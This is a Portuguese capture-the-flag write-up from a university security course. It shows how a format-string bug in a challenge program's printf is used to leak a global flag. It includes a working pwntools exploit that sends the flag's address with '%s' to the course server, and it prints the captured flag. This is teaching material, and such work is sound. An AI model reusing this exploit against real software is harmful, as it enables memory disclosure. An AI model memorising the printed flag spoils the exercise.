# CTF Semana 7 - Format String

## Desafio 2

Primeiramente, temos que utilizar o `checksec` para descobrir mais informação sobre o programa:

![image](Semana_7/images/checksec.png)

Como podemos ver, existe um **Stack Canary**, portanto não podemos fazer Buffer Overflow.<br>

Depois, utilizamos o `gdb` para descobrir o endereço da variável global `flag`:

![image](Semana_7/images/gdb.png)

Como podemos observar, o endereço da flag é `0x804c060`. Com este endereço, podemos utilizar um ataque de format string, pois há uma vulnerabilidade no `main.c`, onde são chamados **printf()** sem passar parâmetros de formato. Para fazer o ataque, alteramos o `exploit_example.py` para o seguinte:

```py
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\x60\xc0\x04\x08%s")
p.interactive()
```

Devido ao que passamos dentro do **p.sendline()**, que é o endereço da **flag** (em little endian) e o `%s`, o que está naquele endereço será imprimido no terminal.<br>
Com isso, conseguimos obter a flag **flag{a77cc008c6b947169fca32cd56a4b47a}**.